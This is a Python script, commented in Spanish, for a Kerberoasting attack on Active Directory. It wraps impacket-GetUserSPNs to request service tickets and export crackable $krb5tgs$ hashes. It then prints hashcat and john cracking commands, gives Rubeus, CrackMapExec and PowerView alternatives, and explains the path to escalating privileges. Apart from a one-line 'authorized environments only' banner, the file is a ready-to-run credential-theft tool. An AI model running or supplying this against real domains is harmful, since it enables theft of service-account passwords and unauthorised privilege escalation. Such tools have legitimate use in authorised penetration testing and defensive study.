#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║       kerberoast.py  —  Kerberoasting Attack Tool           ║
║              Constan4 / Ciber-AD Repository                 ║
╚══════════════════════════════════════════════════════════════╝

Descripción:
    Implementa el ataque Kerberoasting: solicita tickets TGS para
    cuentas de servicio (SPNs) y los exporta en formato hashcat/john
    para crackeo offline.

Funcionamiento:
    1. Autentica con el DC via Kerberos
    2. Enumera usuarios con SPN (servicePrincipalName)
    3. Solicita TGS para cada SPN
    4. Extrae el hash cifrado (crackeable offline)
    5. Exporta en formato $krb5tgs$ para hashcat -m 13100

MITRE ATT&CK:
    T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

Requisitos:
    pip install impacket

Uso:
    python3 kerberoast.py --dc 192.168.1.10 --domain empresa.local -u juan -p Pass123
    python3 kerberoast.py --dc 192.168.1.10 --domain empresa.local -u juan -p Pass123 -o hashes.txt

Crackeo con hashcat:
    hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
    hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

Crackeo con john:
    john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
"""

import argparse
import subprocess
import sys
from datetime import datetime


class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"


def banner():
    print(C.RED + C.BOLD + r"""
  ╔═════════════════════════════════════════════════════╗
  ║   KERBEROAST — Solicitud de TGS para crackeo        ║
  ║   MITRE T1558.003 | Solo en entornos autorizados    ║
  ╚═════════════════════════════════════════════════════╝
""" + C.RESET)


def run_kerberoasting_impacket(dc, domain, user, password, output_file=None):
    """
    Ejecuta Kerberoasting usando impacket-GetUserSPNs.

    impacket-GetUserSPNs es la implementación de referencia.
    Solicita TGS tickets para todos los usuarios con SPN del dominio
    y exporta los hashes en formato hashcat $krb5tgs$23$...
    """
    print(C.BLUE + "  [*]" + C.RESET + " Iniciando Kerberoasting contra " + domain)
    print(C.BLUE + "  [*]" + C.RESET + " DC: " + dc)
    print(C.BLUE + "  [*]" + C.RESET + " Usuario: " + user + "@" + domain)
    print()

    # Construir comando impacket
    cmd = [
        "impacket-GetUserSPNs",
        domain + "/" + user + ":" + password,
        "-dc-ip", dc,
        "-request",          # Solicitar los tickets TGS
        "-outputfile", output_file if output_file else "/dev/stdout",
    ]

    print(C.YELLOW + "  [>] Comando:" + C.RESET)
    print("      " + " ".join(cmd).replace(password, "***") + "\n")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60,
        )

        if result.returncode == 0 or result.stdout:
            output = result.stdout + result.stderr

            # Contar hashes encontrados
            hashes = [l for l in output.split("\n") if l.strip().startswith("$krb5tgs$")]
            spns   = [l for l in output.split("\n") if "ServicePrincipalName" in l or "MSSQLSvc" in l or "/" in l.strip()]

            if hashes:
                print(C.GREEN + C.BOLD + "  [+] KERBEROASTING EXITOSO" + C.RESET)
                print(C.GREEN + "  [+] " + str(len(hashes)) + " hash(es) TGS capturado(s):" + C.RESET)
                print()

                for h in hashes:
                    # Extraer nombre de usuario del hash
                    parts = h.split("$")
                    if len(parts) > 4:
                        svc_user = parts[4] if len(parts) > 4 else "desconocido"
                        print("  " + C.CYAN + svc_user + C.RESET)
                    print("  " + h[:80] + "..." if len(h) > 80 else "  " + h)
                    print()

                if output_file:
                    print(C.GREEN + "  [+] Hashes guardados en: " + output_file + C.RESET)

                print(C.BOLD + "\n  ── Siguiente paso — Crackeo offline ────────────────" + C.RESET)
                outf = output_file or "hashes.txt"
                print("  hashcat -m 13100 " + outf + " /usr/share/wordlists/rockyou.txt")
                print("  john " + outf + " --wordlist=/usr/share/wordlists/rockyou.txt")
                print()

            else:
                print(C.YELLOW + "  [!] No se encontraron usuarios con SPN (Kerberoastables)" + C.RESET)
                print("      El dominio puede no tener cuentas de servicio configuradas.")
                print(output[:500])

        else:
            print(C.RED + "  [-] Error ejecutando GetUserSPNs:" + C.RESET)
            print(result.stderr[:500])

    except FileNotFoundError:
        print(C.RED + "  [-] impacket-GetUserSPNs no encontrado." + C.RESET)
        print("  Instalar: pip install impacket")
        print("  O en Kali: sudo apt install python3-impacket")
        show_manual_instructions(dc, domain, user, password, output_file)
    except subprocess.TimeoutExpired:
        print(C.RED + "  [-] Timeout. Verificar conectividad con " + dc + " puerto 88." + C.RESET)


def show_manual_instructions(dc, domain, user, password, output_file=None):
    """Muestra comandos alternativos si impacket no está disponible."""
    outf = output_file or "kerberoast_hashes.txt"
    print()
    print(C.YELLOW + "  Alternativas disponibles:" + C.RESET)
    print()
    print("  1. impacket-GetUserSPNs (Python):")
    print("     impacket-GetUserSPNs " + domain + "/" + user + ":" + password +
          " -dc-ip " + dc + " -request -outputfile " + outf)
    print()
    print("  2. CrackMapExec:")
    print("     crackmapexec ldap " + dc + " -u " + user + " -p " + password +
          " --kerberoasting " + outf)
    print()
    print("  3. Desde Windows con Rubeus:")
    print("     Rubeus.exe kerberoast /outfile:" + outf)
    print()
    print("  4. Desde Windows con PowerView:")
    print("     Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File " + outf)


def explain_attack():
    """Explica el funcionamiento del ataque."""
    print(C.BOLD + "\n  ── ¿Qué es Kerberoasting? ─────────────────────────────" + C.RESET)
    print("""
  Kerberos permite que cualquier usuario autenticado solicite un
  Ticket de Servicio (TGS) para cualquier servicio registrado en AD.

  El TGS está cifrado con el hash NTLM de la cuenta de servicio.
  → Si la contraseña es débil, se puede crackear OFFLINE.

  Flujo del ataque:
  1. Atacante autenticado solicita TGS para SPN (ej: MSSQLSvc/db01)
  2. El DC devuelve el TGS cifrado con la contraseña del svc account
  3. El atacante extrae el hash cifrado del TGS
  4. Crackea el hash offline con hashcat o john
  5. Obtiene la contraseña en texto plano de la cuenta de servicio

  Si la cuenta de servicio tiene privilegios elevados → escalada directa.
  """)


def parse_args():
    p = argparse.ArgumentParser(
        description="kerberoast.py — Kerberoasting Attack Tool",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("--dc",         required=True,  help="IP del Domain Controller")
    p.add_argument("--domain",     required=True,  help="Nombre del dominio (ej: empresa.local)")
    p.add_argument("-u", "--user",  required=True,  help="Usuario de dominio (cualquier usuario valido)")
    p.add_argument("-p", "--password", required=True, help="Contraseña del usuario")
    p.add_argument("-o", "--output", default=None,  help="Archivo de salida para los hashes")
    p.add_argument("--explain",    action="store_true", help="Explicar el funcionamiento del ataque")
    return p.parse_args()


def main():
    banner()
    args = parse_args()

    if args.explain:
        explain_attack()

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    output = args.output or "kerberoast_" + ts + ".txt"

    run_kerberoasting_impacket(
        dc          = args.dc,
        domain      = args.domain,
        user        = args.user,
        password    = args.password,
        output_file = output,
    )


if __name__ == "__main__":
    main()
